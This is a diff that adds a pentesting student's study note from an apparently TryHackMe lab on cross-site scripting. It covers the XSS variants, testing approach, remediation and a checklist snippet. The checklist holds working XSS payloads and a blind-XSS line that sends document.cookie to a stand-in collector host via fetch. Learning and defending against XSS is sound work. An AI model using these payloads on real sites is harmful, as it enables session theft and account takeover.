@@ -1,0 +1,90 @@
+# XSS — TryHackMe (Junior Pentester)  
+**Date:** 2025-09-24  
+**Type:** Classroom  
+**Scope:** Lab / Authorized only
+
+---
+
+## 1) Context  
+Introduction to Cross-Site Scripting (XSS): what it is, why it’s common and valuable, core variants (reflected, stored, DOM, blind), and how to think about payloads and mitigations.
+
+## 2) Initial hypothesis  
+Learn a new injection class focused on the browser context: understand why XSS is taught separately from generic “Injection,” how payloads execute client-side, and what practical exploitation/defense looks like.
+
+## 3) Tools used  
+- Burp Suite (Proxy, Repeater)  
+- Simple request catcher (Burp Collaborator / RequestBin) for blind XSS  
+- Browser devtools / HTML inspection  
+- nc / simple HTTP server (for callbacks)  
+(Only tools listed—no sensitive options or scripts.)
+
+## 4) Approach (high level)  
+- Map inputs that reach HTML/JS contexts (query/path/header, stored fields, DOM sources like `location.*`).  
+- Classify reflections: reflected vs stored; check if any DOM sinks exist (`innerHTML`, `document.write`, `eval`, `setTimeout` with strings, `srcdoc`).  
+- Build payloads per context: tag, attribute, JS-string; keep a minimal PoC first, then iterate.  
+- For blind scenarios, use OOB callbacks to confirm execution.
+
+## 5) Results / Evidence (sanitized)  
+- Reproduced typical XSS flows across the four variants (guided labs).  
+- Confirmed execution with minimal PoCs (e.g., alert) and with safe callback beacons for blind XSS.  
+- Observed impact model: from UI manipulation to session/token exfil (context-dependent).  
+(Final state: “XSS confirmed in controlled lab via context-specific payloads”; no cookies/tokens disclosed here.)
+
+## 6) Recommended remediation  
+- Context-aware output encoding/escaping (HTML, attribute, JS, URL).  
+- Strong CSP (nonces/hashes), avoid dangerous sinks, prefer safe DOM APIs.  
+- Set cookies `HttpOnly` + `SameSite`; use CSRF protections and origin checks for sensitive actions.  
+- Input validation as a supporting layer; template auto-escaping by default.
+
+## 7) Lessons learned  
+- XSS **is** an injection class, but runs in the **browser**—different sinks, tooling, and defenses than server-side injections.  
+- Four flavors matter operationally: **Reflected**, **Stored**, **DOM-based**, **Blind** (with OOB confirmation).  
+- Payloads = **intention** (goal) + **modification** (how you break context).  
+- Polyglots help discovery but are noisy; prefer minimal, context-specific PoCs for reporting.  
+- Real impact often comes from performing privileged actions or exfiltrating in-page tokens—not just reading cookies.
+
+## 8) Links / Resources  
+- TryHackMe — *Junior Pentester* (room)  
+- OWASP XSS Cheat Sheet / DOM XSS docs  
+- Notion: detailed public write-up
+
+## 9) Snippet
+**Snippet**
+```
+XSS quick checklist:
+- Find reflection/source:
+  * query, path, hash, referrer
+  * postMessage
+  * JSON/template vars
+
+- Identify sink/context:
+  * HTML node
+  * attribute
+  * JS string
+  * URL
+  * event handler
+
+- Minimal payloads per context:
+  * HTML tag: <script>alert(1)</script>
+  * Attribute break: "><img src=x onerror=alert(1)>
+  * JS string break: ';alert(1);//  or  "};alert(1);//
+  
+- DOM XSS:
+  * look for sinks: innerHTML, document.write, eval, setTimeout(string), srcdoc
+  * fed by sources: location.*, document.referrer, postMessage
+
+- Blind XSS (OOB):
+  * use an OOB listener (Burp Collaborator / RequestBin)
+  * example: </textarea><script>fetch('https://YOURCOLLECTOR/?c='+btoa(document.cookie))</script>
+  * Note: HttpOnly cookies aren’t readable by JS.
+
+- Validate impact:
+  * privileged actions
+  * token/CSRF exfil
+  * access to admin contexts
+
+- Defense memo:
+  * Auto-escape templates; encode per context
+  * Apply CSP (nonces/hashes); avoid dangerous sinks
+  * Cookies: HttpOnly + SameSite; enforce CSRF protections
+```
